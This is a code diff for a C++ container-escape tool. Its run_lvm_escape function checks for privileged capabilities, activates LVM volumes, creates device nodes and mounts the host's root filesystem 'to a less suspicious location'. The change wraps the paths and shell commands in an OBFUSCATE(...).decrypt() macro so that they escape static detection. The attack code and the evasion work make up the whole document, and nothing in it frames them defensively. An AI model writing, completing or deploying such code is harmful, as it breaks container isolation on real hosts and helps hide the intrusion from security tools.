@@ -70,7 +70,7 @@ static bool check_privileged(std::string& details) {
         privileged = true;
     }
 
-    std::string status = read_file("/proc/self/status");
+    std::string status = read_file(OBFUSCATE("/proc/self/status").decrypt().c_str());
     size_t cap_pos = status.find("CapEff:");
     if (cap_pos != std::string::npos) {
         std::string cap_line = status.substr(cap_pos, status.find("\n", cap_pos) - cap_pos);
@@ -105,10 +105,10 @@ bool run_lvm_escape(std::string& details) {
     system(("vgchange -ay " + vg_name + " > /dev/null 2>&1").c_str());
     
     // 3. Create device nodes
-    system("vgmknodes > /dev/null 2>&1");
+    system(OBFUSCATE("vgmknodes > /dev/null 2>&1").decrypt().c_str());
     
     // 4. Find the LV path
-    system(("lvdisplay -c > " + tmp_l + " 2>&1").c_str());
+    system((OBFUSCATE("lvdisplay -c > ").decrypt() + tmp_l + OBFUSCATE(" 2>&1").decrypt()).c_str());
     std::string lvs = read_file(tmp_l);
     unlink(tmp_l.c_str());
 
@@ -118,9 +118,9 @@ bool run_lvm_escape(std::string& details) {
     
     // 5. Mount to a less suspicious location
     system(("mkdir -p " + mnt_p).c_str());
-    std::string mount_cmd = "mount " + lv_path + " " + mnt_p + " > /dev/null 2>&1";
+    std::string mount_cmd = OBFUSCATE("mount ").decrypt() + lv_path + " " + mnt_p + OBFUSCATE(" > /dev/null 2>&1").decrypt();
     if (system(mount_cmd.c_str()) == 0) {
-        details += "Host root accessible at " + mnt_p;
+        details += OBFUSCATE("Host root accessible at ").decrypt() + mnt_p;
         return true;
     }
     
